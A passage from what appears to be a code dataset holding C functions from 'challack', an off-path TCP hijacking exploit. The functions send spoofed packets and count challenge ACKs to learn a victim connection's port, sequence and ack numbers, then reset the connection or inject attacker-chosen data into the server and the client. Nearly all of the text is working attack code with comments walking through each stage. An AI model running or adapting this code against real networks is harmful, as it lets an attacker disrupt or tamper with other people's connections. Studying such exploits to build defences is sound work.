CS_SYN_SENT;\n\n\twhile (pconn->state != CS_FINISHED) {\n\t\tpcret = pcap_next_ex(pch, &pchdr, &inbuf);\n\t\tif (pcret == 1) {\n\t\t\tu_char flags;\n\t\t\tuint32_t rack, rseq;\n\t\t\tvoid *data;\n\t\t\tsize_t datalen;\n\n\t\t\tif (tcp_recv(pchdr, inbuf, &flags, &rack, &rseq, &data, &datalen)) {\n\t\t\t\tswitch (pconn->state) {\n\n\t\t\t\t\tcase CS_SYN_SENT:\n\t\t\t\t\t\t/* see if we got a SYN|ACK */\n\t\t\t\t\t\tif ((flags & TH_SYN) && (flags & TH_ACK)\n\t\t\t\t\t\t\t\t&& rack == pconn->seq + 1) {\n\t\t\t\t\t\t\t/* we need to ACK the seq */\n\t\t\t\t\t\t\tpconn->seq = rack;\n\t\t\t\t\t\t\tpconn->ack = rseq + 1;\n\t\t\t\t\t\t\tif (!tcp_send(pch, pconn, TH_ACK, NULL, 0))\n\t\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t\tpconn->state = CS_CONNECTED;\n\n\t\t\t\t\t\t\tprintf(\"[*] TCP handshake complete! Entering interactive session...\\n\");\n\t\t\t\t\t\t\tsetterm(0);\n\n\t\t\t\t\t\t\tif (g_ctx.autostart) {\n\t\t\t\t\t\t\t\tusleep(500000);\n\t\t\t\t\t\t\t\tprintf(\"[*] Commencing attack...\\n\");\n\t\t\t\t\t\t\t\tif (!conduct_offpath_attack())\n\t\t\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase CS_CONNECTED:\n\t\t\t\t\t\tif ((flags & TH_PUSH) && (flags & TH_ACK)\n\t\t\t\t\t\t\t\t&& rack == pconn->seq) {\n\t\t\t\t\t\t\t//printf(\"[*] PSH|ACK received (len %lu)\\n\", datalen);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t/* they just ACK'd what we sent only... */\n\t\t\t\t\t\telse if (flags == TH_ACK && rack == pconn->seq) {\n\t\t\t\t\t\t\t//printf(\"[*] ACK received (len %lu)\\n\", datalen);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t/* perhaps the remote said to shut down... */\n\t\t\t\t\t\telse if (flags & TH_FIN) {\n\t\t\t\t\t\t\tprintf(\"[*] FIN received\\n\");\n\t\t\t\t\t\t\tpconn->ack++;\n\t\t\t\t\t\t\tif (!tcp_send(pch, pconn, TH_ACK, NULL, 0))\n\t\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t\tif (!tcp_send(pch, pconn, TH_FIN, NULL, 0))\n\t\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t\tpconn->state++;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\telse if (flags & TH_RST) {\n\t\t\t\t\t\t\tif (rseq == pconn->ack) {\n\t\t\t\t\t\t\t\tprintf(\"[*] RST received\\n\");\n\t\t\t\t\t\t\t\tpconn->state++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t/* otherwise, drop the RST */\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tprintf(\"[*] Packet with unexpected flags (0x%x) received...\\n\",\n\t\t\t\t\t\t\t\t\tflags);\n\n\t\t\t\t\t\t/* see if we got data from remote... */\n\t\t\t\t\t\tif (datalen > 0) {\n\t\t\t\t\t\t\tssize_t nw;\n\n\t\t\t\t\t\t\tnw = write(fileno(stdout), data, datalen);\n\t\t\t\t\t\t\tif (nw < 0)\n\t\t\t\t\t\t\t\tperror(\"[!] write to stdout failed\");\n\t\t\t\t\t\t\telse if (datalen != (size_t)nw) {\n\t\t\t\t\t\t\t\tfprintf(stderr, \"[!] short write!\\n\");\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tpconn->ack += datalen;\n\t\t\t\t\t\t\tif (!tcp_send(pch, pconn, TH_ACK, NULL, 0))\n\t\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tprintf(\"unknown state??\\n\");\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t/* packet read failure? */\n\t\tif (pcret < 0)\n\t\t\tbreak;\n\n\t\t/* check for keyboard input */\n\t\twhile (pconn->state != CS_FINISHED && kbhit() == 1) {\n\t\t\tint ch = getchar();\n\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\t\tcase 0xa: // LF\n\t\t\t\tcase 0xd: // CR\n\t\t\t\t\toutbuf[outlen++] = '\\n';\n\n\t\t\t\t\t/* start the attack now! */\n\t\t\t\t\tif (strncmp(outbuf, \"start\\n\", 6) == 0) {\n\t\t\t\t\t\tif (!conduct_offpath_attack())\n\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (!tcp_send(pch, pconn, TH_PUSH|TH_ACK, outbuf, outlen))\n\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\tpconn->seq += outlen;\n\t\t\t\t\t}\n\t\t\t\t\toutlen = 0;\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase 0x15: // ^U (NAK)\n\t\t\t\t\t{\n\t\t\t\t\t\tssize_t nw;\n\t\t\t\t\t\tstatic const char *clearline = \"\\r\\033[K\";\n\n\t\t\t\t\t\tnw = write(fileno(stdout), clearline, sizeof(clearline) - 1);\n\t\t\t\t\t\tif (nw < 0)\n\t\t\t\t\t\t\tperror(\"[!] write to stdout failed\");\n\t\t\t\t\t\telse if (nw != sizeof(clearline) - 1) {\n\t\t\t\t\t\t\tfprintf(stderr, \"[!] short write!\\n\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\toutlen = 0;\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase 0x1b: // ^[ (ESC)\n\t\t\t\t\tprintf(\"[*] Connection closed.\\n\");\n\t\t\t\t\tif (!tcp_send(pch, pconn, TH_FIN, NULL, 0))\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\tpconn->seq++;\n\t\t\t\t\tsleep(1);\n\t\t\t\t\tif (!tcp_send(pch, pconn, TH_ACK, NULL, 0))\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\tpconn->state = CS_FINISHED;\n\t\t\t\t\tbreak;\n\n\t\t\t\tdefault:\n\t\t\t\t\toutbuf[outlen++] = ch;\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tsetterm(1);\n\tpcap_close(pch);\n\treturn 0;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * conduct the attack:\n * 1. synchronize with remote clock\n * 2. infer four-tuple\n * 3. infer sequence number\n * 4. infer ack number\n * 5. reset/hijack\n * 6. profit?\n *\n */\n", "func_signal": "int conduct_offpath_attack(void)", "code": "{\n\tpthread_t rth;\n\tstruct timeval attack_start, attack_end, diff;\n\n\t/* generate the packet we'll send over and over to elicit challenge ACKs */\n\tif (!prepare_rst_packet(&g_rst_pkt))\n\t\treturn 0;\n\n\t/* spawn the recv thread. it will live throughout the attack process... */\n\tif (pthread_create(&rth, NULL, recv_thread, NULL)) {\n\t\tfprintf(stderr, \"[!] failed to start recv thread!\\n\");\n\t\treturn 0;\n\t}\n\n\tg_ctx.attacking = 1;\n\n\tgettimeofday(&attack_start, NULL);\n\n\t/* synchronize our processing with the remote host's clock */\n\tif (!sync_time_with_remote())\n\t\treturn 0;\n\n\t/* figure out the target connection's source port number */\n\tif (!infer_four_tuple())\n\t\treturn 0;\n\n\t/* figure out the target connection's sequence number and reset the\n\t * connection if injection was not requested */\n\tif (!infer_sequence_number())\n\t\treturn 0;\n\n\t/* if injection was requested, determine the seq/ack and do the deed */\n\tif (g_ctx.inject_server || g_ctx.inject_client) {\n\t\tu_long guess_start, guess_end;\n\t\tu_long tmp;\n\n\t\t/* figure out the target connection's ack value */\n\t\tif (!infer_ack_number())\n\t\t\treturn 0;\n\n\t\t/* finish determining the sequence number */\n\t\tguess_start = g_ctx.spoof.seq - g_ctx.winsz;\n\t\tguess_end = g_ctx.spoof.seq + g_ctx.winsz;\n\n\t\tif (!infer_sequence_step3_ack(&guess_start, &guess_end))\n\t\t\treturn 0;\n\n\t\t/* inject data as requested */\n\t\tif (!inject_the_data())\n\t\t\treturn 0;\n\t}\n\n\tg_ctx.attacking = 0;\n\tif (pthread_join(rth, NULL))\n\t\tfprintf(stderr, \"[!] pthread_join had an error!\\n\");\n\n\tgettimeofday(&attack_end, NULL);\n\ttimersub(&attack_end, &attack_start, &diff);\n\tprintf(\"[*] Attack took %lu %lu seconds\\n\", diff.tv_sec, diff.tv_usec);\n\n\treturn 1;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * stage 1 - time synchronization\n *\n * 1. send 200 in-window RSTs spaced evenly\n * 2. count the challenge ACKs returned\n * 3. adjust accordingly\n * 4. confirm\n *\n * the goal is exactly 100 challenge ACKs received...\n */\n", "func_signal": "int sync_time_with_remote(void)", "code": "{\n\tint attempts = 0, round = 0, chack_cnt[4] = { 0 };\n\tstruct timeval round_start, start, now;\n\tstruct timeval sync_start;\n#ifdef DEBUG_SYNC_SEND_TIME\n\tstruct timeval diff;\n#endif\n\n\tgettimeofday(&sync_start, NULL);\n\n\t/* if we don't synchronize within 3 attempts, give up.. */\n\twhile (1) {\n\t\tgettimeofday(&round_start, NULL);\n\n\t\t/* sanity check to detect really bad situations... */\n\t\tif (g_chack_cnt > 0) {\n\t\t\tfprintf(stderr, \"[!] WTF? already received challenge ACKs??\\n\");\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* send 200 RSTs, spaced evenly */\n\t\tif (!send_packets_delay(&g_rst_pkt, 200, 5000))\n\t\t\treturn 0;\n\n#ifdef DEBUG_SYNC_SEND_TIME\n\t\tgettimeofday(&now, NULL);\n\t\ttimersub(&now, &round_start, &diff);\n\t\tprintf(\"  send took %lu %lu\\n\", diff.tv_sec, diff.tv_usec);\n#endif\n\n\t\t/* wait for 2 seconds for challenge ACKs... */\n\t\twait_until(\"time-sync recv\", &round_start, 2, 0);\n\n\t\t/* the delay before next round starts here.. */\n\t\tgettimeofday(&start, NULL);\n\n\t\t/* record the number of challenge acks seen */\n\t\tchack_cnt[round] = g_chack_cnt;\n\t\tg_chack_cnt = 0;\n\n\t\tprintf(\"[*] time-sync: round %d - %d challenge ACKs\\n\", round + 1,\n\t\t\t\tchack_cnt[round]);\n\n\t\t/* did we sync?? */\n\t\tif (chack_cnt[round] == 100) {\n\t\t\tif (round == 3) {\n\t\t\t\t/* verified! */\n\t\t\t\tgettimeofday(&now, NULL);\n\t\t\t\ttimersub(&now, &sync_start, &start);\n\t\t\t\tprintf(\"[*] Time synchronization complete (after %lu %lu)\\n\", start.tv_sec, start.tv_usec);\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t/* we got lucky! verify... */\n\t\t\tround = 3;\n\t\t\tcontinue;\n\t\t}\n\n\t\telse if (chack_cnt[round] < 100) {\n\t\t\tfprintf(stderr, \"[!] invalid number of challenge ACKs! WTF?\\n\");\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* not sync'd yet, decide how much to delay */\n\t\telse if (round < 2) {\n\t\t\t/* round 1 -> round 2 : delay by 5ms */\n\t\t\tuint64_t delay = 5000;\n\n\t\t\tif (round == 1) {\n\t\t\t\t/* round 2 -> round 3 : delay precisely */\n\t\t\t\tif (chack_cnt[round] >= chack_cnt[0]) {\n\t\t\t\t\tdelay = (300 - chack_cnt[round]) * 5000;\n\t\t\t\t} else {\n\t\t\t\t\tdelay = (chack_cnt[round] - 100) * 5000;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* do the delay! */\n#ifdef DEBUG_SYNC_DELAY\n\t\t\tprintf(\"    delaying for %lu us\\n\", delay);\n#endif\n\t\t\twait_until(\"time-sync delay\", &start, 0, delay);\n\t\t\tround++;\n\t\t} else {\n\t\t\t/* start over :-/ */\n\t\t\tattempts++;\n\t\t\tif (attempts > 2) {\n\t\t\t\tfprintf(stderr, \"[!] maximum attempts reached! giving up.\\n\");\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tfprintf(stderr, \"[!] reached round %d without success, restarting...\\n\",\n\t\t\t\t\tround + 1);\n\t\t\tround = 0;\n\t\t}\n\t}\n\n\t/* fail! */\n\treturn 0;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * build a test schedule based on the start and end of a range\n */\n", "func_signal": "chunk_t *build_schedule(u_long start, u_long end, u_long chunk_sz, int *pnchunks)", "code": "{\n\tint i, nchunks;\n\tu_long num;\n\tchunk_t *schedule = NULL;\n\n\tnum = end - start;\n\tif (num <= chunk_sz) {\n\t\tfprintf(stderr, \"[!] build_schedule: invalid range (too small)!\\n\");\n\t\treturn NULL;\n\t}\n\tnchunks = (num / chunk_sz) + 1;\n\n\tschedule = (chunk_t *)malloc(sizeof(chunk_t) * nchunks);\n\tif (!schedule) {\n\t\tperror(\"[!] malloc\");\n\t\treturn NULL;\n\t}\n\n\tfor (i = 0; i < nchunks; i++) {\n\t\tschedule[i].start = start + (i * chunk_sz);\n\t\tschedule[i].end = start + ((i + 1) * chunk_sz);\n\t\tif (schedule[i].end > end)\n\t\t\tschedule[i].end = end;\n\t}\n\n\t*pnchunks = nchunks;\n\treturn schedule;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * prym wrote this stuff for me a long time ago, i thank him for it..\n * i modded it to make it portable (i hope)\n *\n * this function will set the terminal to ICANON (canonical mode). this\n * disables line buffering processing special characters (such as EOF, EOL,\n * WERASE etc).\n */\n", "func_signal": "void setterm(int mode)", "code": "{\n\tstatic struct termios tmp, old;\n\tstatic int old_set = 0;\n\n\tif (mode == 0) {\n\t\ttcgetattr(fileno(stdin), &tmp);\n\t\tmemcpy(&old, &tmp, sizeof(struct termios));\n\t\ttmp.c_lflag &= ~ICANON;\n\t\ttcsetattr(fileno(stdin), TCSANOW, &tmp);\n\t\told_set = 1;\n\t} else if (old_set) {\n\t\ttcsetattr(fileno(stdin), TCSANOW, &old);\n\t}\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * this function select(2)s stdin and returns 1 if there are characters in the\n * input buffer within the alotted time.\n * otherwise it returns 0 (what select(2) returns)\n */\n", "func_signal": "int kbhit(void)", "code": "{\n\tfd_set rfds;\n\tstruct timeval tv;\n\n\tFD_ZERO(&rfds);\n\tFD_SET(fileno(stdin), &rfds);\n\ttv.tv_sec = 0;\n\ttv.tv_usec = 25000;\n\n\treturn select(fileno(stdin) + 1, &rfds, NULL, NULL, &tv);\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * return a string showing which flags are set in the TCP packet\n *\n * netinet/tcp.h:# define TH_FIN      0x01\n * netinet/tcp.h:# define TH_SYN      0x02\n * netinet/tcp.h:# define TH_RST      0x04\n * netinet/tcp.h:# define TH_PUSH     0x08\n * netinet/tcp.h:# define TH_ACK      0x10\n * netinet/tcp.h:# define TH_URG      0x20\n */\n", "func_signal": "char *tcp_flags(u_char flags)", "code": "{\n\tstatic char str[16];\n\tchar *ptr = str;\n\n\tif (flags & TH_FIN)\n\t\t*ptr++ = 'F';\n\tif (flags & TH_SYN)\n\t\t*ptr++ = 'S';\n\tif (flags & TH_RST)\n\t\t*ptr++ = 'R';\n\tif (flags & TH_PUSH)\n\t\t*ptr++ = 'P';\n\tif (flags & TH_ACK)\n\t\t*ptr++ = 'A';\n\tif (flags & TH_URG)\n\t\t*ptr++ = 'U';\n\t*ptr++ = '\\0';\n\treturn str;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * wait until the specified amount of time has elapsed\n */\n", "func_signal": "void wait_until(const char *desc, struct timeval *pstart, time_t sec, suseconds_t usec)", "code": "{\n\tstruct timeval now, diff;\n\tuint64_t wait_time = usec + (sec * 1000000);\n\tuint64_t waited = 0;\n\n\t/* if we already reached the time, we need to adjust... */\n\tgettimeofday(&now, NULL);\n\ttimersub(&now, pstart, &diff);\n\twaited = diff.tv_usec + (diff.tv_sec * 1000000);\n#ifdef DEBUG_WAIT_UNTIL\n\tprintf(\"    waiting %lu, already waited %lu...\\n\", wait_time, waited);\n#endif\n\tif (waited > wait_time) {\n\t\tfprintf(stderr, \"[!] %s : already reached time! (%lu %lu vs. %lu %lu)\\n\",\n\t\t\t\tdesc, diff.tv_sec, diff.tv_usec, sec, usec);\n\t\t(void)unblock_traffic();\n\t\texit(1); // EWW\n\t}\n\n\tfor (;;) {\n\t\tusleep(250);\n\t\tgettimeofday(&now, NULL);\n\t\ttimersub(&now, pstart, &diff);\n\t\twaited = diff.tv_usec + (diff.tv_sec * 1000000);\n\t\tif (waited >= wait_time)\n\t\t\tbreak;\n\t}\n#ifdef DEBUG_WAIT_UNTIL\n\tprintf(\"    %s took %lu %lu\\n\", desc, diff.tv_sec, diff.tv_usec);\n#endif\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * prepare the RST packet we'll use to elicit challenge ACKs on our legit\n * connection.\n */\n", "func_signal": "int prepare_rst_packet(packet_t *ppkt)", "code": "{\n\tuint32_t old_seq;\n\tvolatile conn_t *legit = &(g_ctx.legit);\n\n\t/* save the old sequence number */\n\told_seq = legit->seq;\n\n\t/* advance it by some amount so that it is out of window */\n\tlegit->seq += 5000;\n\n\t/* allocate a buffer for the packet */\n\tppkt->len = 8192;\n\tppkt->buf = malloc(ppkt->len);\n\tif (!ppkt->buf) {\n\t\tfprintf(stderr, \"[!] no memory for RST packet!\\n\");\n\t\treturn 0;\n\t}\n\n\t/* add the phys header */\n\tmemcpy(ppkt->buf, ROUTER_MAC LOCAL_MAC \"\\x08\\x00\", g_ctx.ipoff);\n\n\t/* craft the packet! */\n\tif (!tcp_craft(ppkt->buf + g_ctx.ipoff, &(ppkt->len), legit, TH_RST, \"z\", 1))\n\t\treturn 0;\n\n\t/* adjust the length to include the phys part */\n\tppkt->len += g_ctx.ipoff;\n\n\t/* set the sequence number back to the original value..\n\t * this way the connection remains ok.\n\t */\n\tlegit->seq = old_seq;\n\treturn 1;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * remove traffic block traffic!\n */\n", "func_signal": "int unblock_traffic(void)", "code": "{\n\tchar cmd[128];\n\tint ret;\n\tvolatile struct sockaddr_in *psrv = &(g_ctx.legit.dst);\n\n\tsprintf(cmd, \"iptables -D INPUT -j DROP -p tcp -s %s --sport %u > /dev/null 2>&1\",\n\t\t\tinet_ntoa(psrv->sin_addr), ntohs(psrv->sin_port));\n\tret = system(cmd);\n\tif (ret == 0) {\n\t\tprintf(\"[*] Un-blocked traffic from legit server\\n\");\n\t\treturn 1;\n\t}\n\n\tif (ret == -1)\n\t\tperror(\"[!] system(\\\"iptables -D\\\"... failed\");\n\telse\n\t\tfprintf(stderr, \"[!] system(\\\"iptables -D\\\"... failed: ret: %d\\n\", ret);\n\treturn 0;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * if needed, inject data into the connection\n *\n * inject data into a connection by trying various offsets of the guessed\n * seq/ack numbers\n */\n", "func_signal": "int inject_the_data(void)", "code": "{\n\tstruct timeval inject_start, round_start, now, diff;\n\tvolatile conn_t *spoof = &(g_ctx.spoof);\n\tconn_t reversed;\n\n\t/* feign success if we have nothing to inject */\n\tif (!g_ctx.inject_server && !g_ctx.inject_client)\n\t\treturn 1;\n\n\tif (g_ctx.inject_client) {\n\t\t/* swap the src/dst and seq/ack to send to the client */\n\t\treversed.src = spoof->dst;\n\t\treversed.dst = spoof->src;\n\t\treversed.seq = spoof->ack;\n\t\treversed.ack = spoof->seq;\n\t}\n\t/* the seq/ack are maintained separately for client and server */\n\n\tgettimeofday(&inject_start, NULL);\n\n\twhile (1) {\n\t\tchar *buf;\n\t\toff_t len;\n\n\t\tgettimeofday(&round_start, NULL);\n\n\t\tif (g_ctx.inject_server) {\n\t\t\tint i;\n\t\t\tuint32_t seq_tmp;\n\n\t\t\tbuf = g_ctx.inject_server;\n\t\t\tlen = g_ctx.inject_server_len;\n\n\t\t\tprintf(\"[*] Injecting %lu bytes into the server!\\n\", len);\n\n\t\t\tseq_tmp = spoof->seq;\n\t\t\tfor (i = 1000; i > -1000; i--) {\n\t\t\t\tspoof->seq = seq_tmp + i;\n\t\t\t\tif (!tcp_send(g_ctx.pch, spoof, TH_PUSH|TH_ACK, buf, len))\n\t\t\t\t\treturn 0;\n\t\t\t\tusleep(g_ctx.packet_delay);\n\t\t\t}\n\t\t\tspoof->seq = seq_tmp + len;\n\t\t}\n\n\t\tif (g_ctx.inject_client) {\n\t\t\tint i;\n\t\t\tuint32_t seq_tmp;\n\n\t\t\tbuf = g_ctx.inject_client;\n\t\t\tlen = g_ctx.inject_client_len;\n\n\t\t\tprintf(\"[*] Injecting %lu bytes into the client!\\n\", len);\n\n\t\t\tseq_tmp = reversed.seq;\n\t\t\tfor (i = 1000; i > -1000; i--) {\n\t\t\t\treversed.seq = seq_tmp + i;\n\t\t\t\tif (!tcp_send(g_ctx.pch, &reversed, TH_PUSH|TH_ACK, buf, len))\n\t\t\t\t\treturn 0;\n\t\t\t\tusleep(g_ctx.packet_delay);\n\t\t\t}\n\t\t\treversed.seq = seq_tmp + len;\n\t\t}\n\n\t\tgettimeofday(&now, NULL);\n\t\ttimersub(&now, &inject_start, &diff);\n\t\tif (diff.tv_sec > 30)\n\t\t\tbreak;\n\n\t\twait_until(\"data-inject\", &round_start, 2, 0);\n\t}\n\treturn 1;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/*\n * ripped from ping.c, it calulates the checksum of len bytes at addr and\n * returns it.\n */\n", "func_signal": "uint16_t in_cksum(uint16_t *addr, size_t len)", "code": "{\n\tregister int nleft = len;\n\tregister uint16_t *w = addr;\n\tregister int sum = 0;\n\tuint16_t answer = 0;\n\n\twhile (nleft > 1) {\n\t\tsum += *w++;\n\t\tnleft -= 2;\n\t}\n\n\tif (nleft == 1) {\n\t\t*(u_char *)(&answer) = *(u_char *)w;\n\t\tsum += answer;\n\t}\n\n\tsum = (sum >> 16) + (sum & 0xffff);\n\tsum += (sum >> 16);\n\tanswer = ~sum;\n\treturn answer;\n}", "path": "challack.c", "repo_name": "jduck/challack", "stars": 71, "license": "None", "language": "c", "size": 228}
{"docstring": "/* stage 2 - four tuple inference\n *\n * send a spoofed SYN|ACK to try to elicit a challenge ACK for the purported\n * connection from our victim.\n */\n", "func_signal": "int infer_four_tuple(void)", "code": "{\n\tstruct timeval infer_start, round_start, now, diff;\n\tvolatile conn_t *spoof = &(g_ctx.spoof);\n\tint test_mode = -1;\n\t/* chunk-based search vars */\n\tchunk_t *sched = NULL;\n\tint nchunks = 0, ci = 0;\n\t/* binary search vars */\n\tu_long bs_start = 0, bs_end = 0, bs_mid = 0;\n\tvolatile uint16_t *pport;\n\n\tgettimeofday(&infer_start, NULL);\n\n\tif (g_ctx.client_mode)\n\t\tpport = &(spoof->dst.sin_port);\n\telse\n\t\tpport = &(spoof->src.sin_port);\n\n\twhile (1) {\n\t\tgettimeofday(&round_start, NULL);\n\n\t\t/* sanity check to detect really bad situations... */\n\t\tif (g_chack_cnt > 0) {\n\t\t\tfprintf(stderr, \"[!] WTF? already received challenge ACKs??\\n\");\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* we have three possibilities:\n\t\t * 1. we have a port hint -- we just want to test that one (but fall\n\t\t *    back if it fails) -- test_mode:0\n\t\t * 2. we have > PACKETS_PER_SECOND ports to test -- we want to use a\n\t\t *    schedule -- test_mode:1\n\t\t * 3. we have < PACKETS_PER_SECOND ports to test -- we want to use a\n\t\t *    modified binary search. -- test_mode:2\n\t\t */\n\n\t\t/* if we need to initialize the ranges, do so now */\n\t\tif (test_mode == -1) {\n\t\t\t/* if we already have a guess, try it first */\n\t\t\tif (*pport) {\n\t\t\t\t/* if it hits, we set these equal to signify a win.\n\t\t\t\t *\n\t\t\t\t * we leave guess_mid set to 0 in case we missed..\n\t\t\t\t */\n\t\t\t\tbs_mid = bs_start = bs_end = ntohs(*pport);\n\t\t\t\ttest_mode = 0;\n\t\t\t}\n\t\t\t/* no initial guess available... */\n\t\t\telse {\n\t\t\t\t/* initialize algorithm for port number checking\n\t\t\t\t * ... \"the default range on Linux is only from 32768 to 61000\"\n\t\t\t\t */\n\t\t\t\t// XXX: TODO: scale number of guesses per round based on feedback\n\t\t\t\tsched = build_schedule(32768, 61000, g_ctx.packets_per_second, &nchunks);\n\t\t\t\tif (!sched)\n\t\t\t\t\treturn 0;\n\n\t\t\t\t/* process chunks from 0 to nchunks */\n\t\t\t\ttest_mode = 1;\n\t\t\t}\n\t\t\t/* test_mode 2 is launched via schedule exhaustion.. */\n\t\t}\n\n\t\t/* send spoofed packets in an attempt to elicit challenge ACKs to the\n\t\t * victim. depending on how many ports we need to probe, we may use a\n\t\t * different approach */\n\t\tif (test_mode == 0) {\n\t\t\t/* just test this single one */\n\t\t\tif (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))\n\t\t\t\treturn 0;\n\t\t} else if (test_mode == 1) {\n\t\t\t/* process the current chunk */\n\t\t\tu_long guess;\n\n\t\t\tbs_mid = bs_start = sched[ci].start;\n\t\t\tbs_end = sched[ci].end;\n\t\t\t// XXX: TODO: implement optmization for < 14 ports to probe...\n\t\t\tfor (guess = bs_start; guess < bs_end; guess++) {\n\t\t\t\t*pport = htons(guess);\n\t\t\t\tif (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))\n\t\t\t\t\treturn 0;\n\t\t\t\tusleep(g_ctx.packet_delay);\n\t\t\t}\n\n\t\t\t/* we'll do maintenance after we check the results */\n\t\t} else if (test_mode == 2) {\n\t\t\t/* advance the binary search process! */\n\t\t\tu_long guess;\n\n\t\t\tbs_mid = (bs_start + bs_end) / 2;\n\t\t\t// XXX: TODO: implement optmization for < 14 ports to probe...\n\t\t\tfor (guess = bs_mid; guess < bs_end; guess++) {\n\t\t\t\t*pport = htons(guess);\n\t\t\t\tif (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))\n\t\t\t\t\treturn 0;\n\t\t\t\tusleep(g_ctx.packet_delay);\n\t\t\t}\n\t\t}\n\n\t\t/* ensure we only send a single value once */\n\t\t*pport = 0;\n\n#ifdef DEBUG_TUPLE_INFER_SPOOF_SEND\n\t\tgettimeofday(&now, NULL);\n\t\ttimersub(&now, &round_start, &diff);\n\t\tprintf(\"    sent %lu spoofed SYN|ACK packets in %lu %lu\\n\",\n\t\t\t\tbs_end - bs_start, diff.tv_sec, diff.tv_usec);\n#endif\n\n\t\t/* send 100 RSTs */\n\t\tif (!send_packets_delay(&g_rst_pkt, 100, 1000))\n\t\t\treturn 0;\n\n\t\t/* get the number of challenge ACKs within this second */\n\t\twait_until(\"tuple-infer recv\", &round_start, 1, 0);\n\n\t\tprintf(\"[*] tuple-infer: guessed port is in [%lu - %lu) (start: %lu): %3d challenge ACKs - %s\\n\",\n\t\t\t\tbs_mid, bs_end, bs_start,\n\t\t\t\tg_chack_cnt, g_chack_cnt == 99 ? \"OK\" : \"NO\");\n\n\t\t/* adjust the search based on the results and mode */\n\t\tif (g_chack_cnt == 100) {\n\t\t\tg_chack_cnt = 0;\n\n\t\t\t/* if we exhausted the range and still didn't find it, start over */\n\t\t\tif (test_mode == 0) {\n\t\t\t\t/* failed! try the bigger search.. */\n\t\t\t\tprintf(\"[!] Your hint was incorrect! Falling back to search...\\n\");\n\t\t\t\ttest_mode = -1;\n\t\t\t} else if (test_mode == 1) {\n\t\t\t\t/* advance the chunk */\n\t\t\t\tci++;\n\t\t\t\tif (ci == nchunks) {\n\t\t\t\t\tprintf(\"[!] Exhausted port chunk search...\\n\");\n\t\t\t\t\treturn 0;\n\t\t\t\t}\n\t\t\t} else if (test_mode == 2) {\n\t\t\t\tif (bs_start >= bs_end) {\n\t\t\t\t\t/* FAIL! */\n\t\t\t\t\tprintf(\"[!] Exhausted port binary search...\\n\");\n\t\t\t\t\t/* go back to the beginning of the schedule?? */\n\t\t\t\t\treturn 0;\n\t\t\t\t} else {\n\t\t\t\t\t/* adjust range */\n\t\t\t\t\tbs_end = bs_mid;\n\t\t\t\t}\n\t\t\t}\n\t\t} else if (g_chack_cnt == 99) {\n\t\t\tg_chack_cnt = 0;\n\n\t\t\tif (test_mode == 0) {\n\t\t\t\t/* correct! */\n\t\t\t\tgettimeofday(&now, NULL);\n\t\t\t\ttimersub(&now, &infer_start, &diff);\n\t\t\t\tprintf(\"[*] Confirmed client port (from hint): %lu (after %lu %lu)\\n\",\n\t\t\t\t\t\tbs_start, diff.tv_sec, diff.tv_usec);\n\t\t\t\t*pport = ntohs(bs_start);\n\t\t\t\treturn 1;\n\t\t\t} else if (test_mode == 1) {\n\t\t\t\t/* proceed to a binary search of this block */\n\t\t\t\t/* if there was only one port tested, it must be it! */\n\t\t\t\tif (bs_end - bs_start <= 1) 